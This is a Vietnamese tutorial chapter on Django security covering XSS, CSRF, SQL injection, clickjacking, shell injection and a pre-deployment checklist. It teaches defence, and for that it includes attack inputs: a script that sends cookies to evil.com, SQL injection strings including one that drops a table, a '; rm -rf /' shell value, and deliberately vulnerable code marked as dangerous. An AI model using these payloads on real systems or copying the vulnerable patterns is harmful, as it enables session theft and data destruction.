### Chương 12: Bảo mật (Tổng quan)

Chương này tập trung vào các mối đe dọa bảo mật phổ biến trong ứng dụng web và cách Django giúp bảo vệ ứng dụng khỏi chúng. Nó cũng cung cấp danh sách kiểm tra bảo mật để đảm bảo ứng dụng an toàn trước khi triển khai.

#### Nội dung chính:
1. **Cross-site Scripting (XSS)**
2. **Cross-site Request Forgery (CSRF)**
3. **SQL Injection**
4. **Clickjacking**
5. **Shell Injection**
6. **Các cuộc tấn công web khác**
7. **Danh sách kiểm tra bảo mật**

---

### 1. Cross-site Scripting (XSS)

#### XSS là gì?
XSS xảy ra khi kẻ tấn công chèn mã JavaScript độc hại vào trang web, chạy trên trình duyệt của người dùng. Điều này có thể đánh cắp cookie, dữ liệu phiên (session) hoặc thực hiện hành động thay mặt người dùng.

#### Tại sao cookie có giá trị?
Cookie thường chứa thông tin phiên (session ID), nếu bị đánh cắp, kẻ tấn công có thể giả danh người dùng.

#### Django giúp như thế nào?
- **Mã hóa tự động**: Django tự động thoát (escape) các ký tự đặc biệt trong template để ngăn chèn mã độc.
- Ví dụ:
```html
<!-- templates/xss.html -->
<p>{{ user_input }}</p>
```
```python
# views.py
def xss_view(request):
    user_input = request.GET.get("input", "")
    return render(request, "xss.html", {"user_input": user_input})
```
- Nếu `user_input = "<script>alert('XSS');</script>"`, Django sẽ hiển thị nó như văn bản thay vì chạy mã:
```
<p>&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</p>
```

#### Nơi Django không giúp được:
- Nếu bạn đánh dấu dữ liệu là "an toàn" (safe) hoặc dùng `mark_safe()` sai cách:
```python
from django.utils.safestring import mark_safe

def xss_view(request):
    user_input = "<script>alert('XSS');</script>"
    return render(request, "xss.html", {"user_input": mark_safe(user_input)})
```
- Kết quả: Mã JavaScript sẽ chạy, gây nguy hiểm.

#### Ví dụ thực tế:
- Người dùng nhập `<script>document.location='http://evil.com?cookie='+document.cookie</script>` → Cookie bị gửi đến `evil.com`.

---

### 2. Cross-site Request Forgery (CSRF)

#### CSRF là gì?
CSRF lừa người dùng thực hiện hành động không mong muốn (như chuyển tiền) trên trang web mà họ đã đăng nhập, bằng cách gửi yêu cầu giả mạo từ trang khác.

#### Django giúp như thế nào?
- **CSRF Token**: Django yêu cầu token trong mỗi form POST để xác minh yêu cầu hợp lệ.
- Ví dụ:
```html
<!-- templates/form.html -->
<form method="post">
    {% csrf_token %}
    <input type="text" name="data">
    <button type="submit">Gửi</button>
</form>
```
```python
# views.py
from django.shortcuts import render

def form_view(request):
    if request.method == "POST":
        data = request.POST.get("data")
        return render(request, "form.html", {"data": data})
    return render(request, "form.html")
```
- Không có `{% csrf_token %}`, Django trả về lỗi 403.

#### Nơi Django không giúp được:
- Nếu bạn vô hiệu hóa middleware CSRF (`CsrfViewMiddleware`) hoặc không dùng token trong form AJAX:
```javascript
// AJAX không an toàn
fetch("/form/", { method: "POST", body: "data=test" })
```
- Cần thêm header `X-CSRFToken`:
```javascript
fetch("/form/", {
    method: "POST",
    headers: {"X-CSRFToken": getCookie("csrftoken")},
    body: "data=test"
})
```

#### Ví dụ thực tế:
- Người dùng đăng nhập ngân hàng, mở tab độc hại gửi POST giả → Chuyển tiền mà không biết.

---

### 3. SQL Injection

#### SQL Injection là gì?
Kẻ tấn công chèn mã SQL độc hại vào truy vấn, thay đổi logic hoặc truy cập dữ liệu không được phép.

#### Django giúp như thế nào?
- **ORM an toàn**: Django dùng tham số hóa truy vấn (parameterized queries) thay vì nối chuỗi.
- Ví dụ an toàn:
```python
# views.py
def tim_san_pham(request):
    ten = request.GET.get("ten", "")
    san_pham = SanPham.objects.filter(ten=ten)
    return render(request, "danh_sach.html", {"san_pham": san_pham})
```
- Truy vấn được tham số hóa, tránh injection.

#### Nơi Django không giúp được:
- Nếu dùng truy vấn thô (raw SQL) không an toàn:
```python
from django.db import connection

def tim_san_pham_nguy_hiem(request):
    ten = request.GET.get("ten", "")
    with connection.cursor() as cursor:
        cursor.execute(f"SELECT * FROM sanpham WHERE ten = '{ten}'")
        ket_qua = cursor.fetchall()
    return render(request, "danh_sach.html", {"san_pham": ket_qua})
```
- Nếu `ten = "'; DROP TABLE sanpham; --"`, bảng sẽ bị xóa.

#### Ví dụ thực tế:
- Hacker nhập `' OR '1'='1` → Lấy toàn bộ dữ liệu người dùng.

---

### 4. Clickjacking

#### Clickjacking là gì?
Kẻ tấn công lừa người dùng nhấp vào nút ẩn dưới iframe, thực hiện hành động không mong muốn (như "Thích" trang).

#### Django giúp như thế nào?
- **Middleware X-Frame-Options**: Ngăn trang bị nhúng trong iframe.
```python
# settings.py
MIDDLEWARE += ["django.middleware.clickjacking.XFrameOptionsMiddleware"]
X_FRAME_OPTIONS = "DENY"  # Hoặc "SAMEORIGIN"
```
- Trình duyệt từ chối nhúng trang nếu không cùng nguồn.

#### Ví dụ thực tế:
- Trang độc hại nhúng iframe `<iframe src="http://ngan-hang.com/chuyen-tien"></iframe>` → Người dùng nhấp nhầm, chuyển tiền.

---

### 5. Shell Injection

#### Shell Injection là gì?
Kẻ tấn công chèn lệnh hệ thống qua đầu vào người dùng, chạy mã độc trên server.

#### Django giúp như thế nào?
- Không có hàm chạy shell trực tiếp, nhưng nếu dùng `subprocess`, cần cẩn thận:
```python
import subprocess

def chay_lenh(request):
    file = request.GET.get("file", "")
    # NGUY HIỂM
    subprocess.run(f"cat {file}", shell=True)  # Dễ bị injection
```
- An toàn hơn:
```python
def chay_lenh_an_toan(request):
    file = request.GET.get("file", "")
    subprocess.run(["cat", file], shell=False)  # Không dùng shell
```

#### Ví dụ thực tế:
- `file = "; rm -rf /"` → Xóa toàn bộ file trên server.

---

### 6. Các cuộc tấn công web khác (And the web attacks are unending)

Ngoài các mối đe dọa trên, còn có:
- **Session Hijacking**: Đánh cắp session ID.
- **Man-in-the-Middle (MITM)**: Chặn dữ liệu giữa client và server.
- **DDoS**: Làm quá tải server.

Django không bảo vệ hoàn toàn khỏi mọi tấn công, nhưng cấu hình đúng (HTTPS, mã hóa mật khẩu) giúp giảm rủi ro.

---

### 7. Danh sách kiểm tra bảo mật (A handy security checklist)

#### Trước khi triển khai:
- **Tắt DEBUG**: `DEBUG = False` trong `settings.py`.
- **HTTPS**: Dùng SSL/TLS cho giao tiếp an toàn.
- **Mật khẩu mạnh**: Dùng `django.contrib.auth.hashers.PBKDF2PasswordHasher`.
- **Cập nhật**: Cài phiên bản mới nhất của Django và thư viện.
- **Kiểm tra middleware**: Đảm bảo `SecurityMiddleware`, `CsrfViewMiddleware` được bật.
- **Quyền truy cập**: Giới hạn quyền admin, dùng `ALLOWED_HOSTS`.

#### Ví dụ cấu hình an toàn:
```python
# settings.py
DEBUG = False
ALLOWED_HOSTS = ["example.com"]
SECURE_SSL_REDIRECT = True  # Chuyển hướng sang HTTPS
CSRF_COOKIE_SECURE = True  # Chỉ gửi CSRF qua HTTPS
SESSION_COOKIE_SECURE = True
```

---

### Tóm tắt
- **XSS**: Django thoát ký tự, tránh `mark_safe()` sai cách.
- **CSRF**: Dùng `{% csrf_token %}` trong form.
- **SQL Injection**: Dùng ORM, tránh raw SQL không an toàn.
- **Clickjacking**: Bật `XFrameOptionsMiddleware`.
- **Shell Injection**: Tránh shell trong `subprocess`.
- **Checklist**: Tắt DEBUG, dùng HTTPS, cập nhật thường xuyên.